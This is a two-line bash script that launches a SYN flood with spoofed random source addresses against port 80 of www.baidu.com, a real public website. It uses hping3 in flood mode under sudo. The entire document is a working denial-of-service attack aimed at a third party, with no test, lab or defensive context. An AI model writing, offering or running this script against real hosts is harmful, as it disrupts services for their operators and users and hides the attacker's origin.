#! /bin/bash


TARGET=www.baidu.com
sudo hping3 --rand-source $TARGET -S -q -p 80 --flood
